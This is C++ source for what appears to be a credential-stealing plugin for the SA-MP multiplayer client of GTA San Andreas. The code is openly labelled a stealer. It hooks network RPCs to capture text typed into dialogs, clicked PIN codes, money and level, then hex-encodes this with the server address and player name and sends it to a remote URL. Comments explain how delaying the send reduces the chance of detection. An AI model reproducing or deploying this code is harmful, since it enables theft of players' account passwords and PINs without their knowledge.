#define _WIN32_WINNT 0x0501
#define _CRT_SECURE_NO_WARNINGS 1

#include "main.h"

using namespace std;

SAMPFUNCS *SF = new SAMPFUNCS();

#define URL_SITE	"http://site.ru"
#define URL_PAGE	"/reports/get.php?data="
#define AGENT_NAME	"Explorer"

#define BASE_ID	0
#define STEALER_TYPE "SF"

enum eDataTypes
{
	PINCODE = 1000,
	LEVEL = 1001,
	SKIN_ID = 1002,
	MONEY = 1003
};

void parsePage(string url, string request, string& out)
{
	out.clear();

	HINTERNET hInternet = InternetOpen(AGENT_NAME, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet != NULL)
	{
		HINTERNET hConnect = InternetConnect(hInternet, url.c_str(), INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1u);

		if (hConnect != NULL)
		{
			HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", request.c_str(), NULL, NULL, 0, INTERNET_FLAG_KEEP_CONNECTION, 1);

			if (hRequest != NULL)
			{
				// Send the request
				BOOL bSend = HttpSendRequest(hRequest, NULL, 0, NULL, 0);

				if (bSend)
				{
					while (true)
					{
						// Read a data
						char *szData = new char[1024];
						DWORD dwBytesRead;

						BOOL bRead = InternetReadFile(hRequest, szData, sizeof(szData) - 1, &dwBytesRead);

						if (bRead == FALSE || dwBytesRead == 0)
							break;

						szData[dwBytesRead] = 0;

						out += szData;

						delete[] szData;
					}
				}
			}
			InternetCloseHandle(hRequest);
		}
		InternetCloseHandle(hConnect);
	}
	InternetCloseHandle(hInternet);
};

void threadSendStealData(void* param)
{
	string strData = *(string*)param;

	// Delay (milliseconds). 
	// Use it to reduce the probability of detection by sent packets.
	Sleep(10000);		

	string not_use;

	parsePage(URL_SITE, URL_PAGE + strData, not_use);
}

void sendResults(int iID, std::string strData)
{
	std::string strFormat = "%s&&%d&&%s:%d&&%s&&%s&&%d&&%s";

	char szResults[0x500];

	sprintf(szResults, strFormat.c_str(), STEALER_TYPE, BASE_ID,
		SF->getSAMP()->getInfo()->szIP,
		SF->getSAMP()->getInfo()->ulPort,
		SF->getSAMP()->getInfo()->szHostname,
		SF->getSAMP()->getPlayers()->GetPlayerName(SF->getSAMP()->getPlayers()->sLocalPlayerID),
		iID,
		strData.c_str());

	std::string strResult = std::string(szResults, strlen(szResults));

	// This is for debugging. Delete it in a real project.
	SF->getSAMP()->getChat()->AddChatMessage(D3DCOLOR_XRGB(0, 0xAA, 0), "debug: %s", strResult.c_str());

	// Additional encoding. Use if need.
	// for (char &i : strResult) i ^= 1111;

	strResult = boost::algorithm::hex(strResult);

	_beginthread(threadSendStealData, 0, new string(strResult));
};

bool CALLBACK incomingRPC(stRakNetHookParams *params)
{
	params->bitStream->ResetReadPointer();

	if (params->packetId == ScriptRPCEnumeration::RPC_ScrSetPlayerSkin)
	{
		int iPlayerID, iSkinID;

		params->bitStream->Read(iPlayerID);
		params->bitStream->Read(iSkinID);

		if (iPlayerID == SF->getSAMP()->getPlayers()->sLocalPlayerID)
		{
			sendResults(eDataTypes::SKIN_ID, to_string(iSkinID));

			SF->getSAMP()->getInfo()->UpdateScoreAndPing();
		};
	}
	else if (params->packetId == ScriptRPCEnumeration::RPC_ScrGivePlayerMoney)
	{
		int iMoneyCount;
		params->bitStream->Read(iMoneyCount);

		sendResults(eDataTypes::MONEY, to_string(iMoneyCount));
	}
	else if (params->packetId == RPCEnumeration::RPC_UpdateScoresPingsIPs)
	{
		unsigned short playerId;
		int iPlayerScore, iPlayerPing;

		for (unsigned short i = 0; i < (params->bitStream->GetNumberOfBitsUsed() / 8) / 10; ++i)
		{
			params->bitStream->Read(playerId);
			params->bitStream->Read(iPlayerScore);
			params->bitStream->Read(iPlayerPing);

			if (playerId == SF->getSAMP()->getPlayers()->sLocalPlayerID)
			{
				sendResults(eDataTypes::LEVEL, to_string(iPlayerScore));
			}
		}
	}

	params->bitStream->ResetReadPointer();

	return true;
}

bool CALLBACK outcomingRPC(stRakNetHookParams *params)
{
	params->bitStream->ResetReadPointer();

	if (params->packetId == RPCEnumeration::RPC_DialogResponse)
	{
		unsigned short sDialogID, sItem;
		byte buttonID, inputLen;
		char szInput[0x1000];

		params->bitStream->Read(sDialogID);
		params->bitStream->Read(buttonID);
		params->bitStream->Read(sItem);
		params->bitStream->Read(inputLen);
		params->bitStream->Read(szInput, inputLen);

		szInput[inputLen] = '\0';

		std::string strBody = std::string(szInput, inputLen);

		if ((sItem == 65535) && (!strBody.empty()))
			sendResults(sDialogID, std::string(szInput, inputLen));
	}
	else if (params->packetId == RPCEnumeration::RPC_ClickTextDraw)
	{
		static std::string strPinCode;

		byte id;

		params->bitStream->Read(id);

		stTextdrawPool *td = SF->getSAMP()->getInfo()->pPools->pTextdraw;

		if (td->iPlayerTextDraw[id] && (strPinCode.length() < 4))
			strPinCode += td->playerTextdraw[id]->szText;

		if (id == 255)
		{
			sendResults(eDataTypes::PINCODE, strPinCode);
			strPinCode.clear();
		}
	}

	params->bitStream->ResetReadPointer();

	return true;
}

void __stdcall mainloop()
{
	static bool initialized = false;
	if (!initialized)
	{
		if (GAME && GAME->GetSystemState() == eSystemState::GS_PLAYING_GAME && SF->getSAMP()->IsInitialized())
		{
			initialized = true;
			SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_OUTCOMING_RPC, outcomingRPC);
			SF->getRakNet()->registerRakNetCallback(RakNetScriptHookType::RAKHOOK_TYPE_INCOMING_RPC, incomingRPC);
		}
	}
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReasonForCall, LPVOID lpReserved)
{
	if (dwReasonForCall == DLL_PROCESS_ATTACH)
		SF->initPlugin(mainloop, hModule);
	return TRUE;
}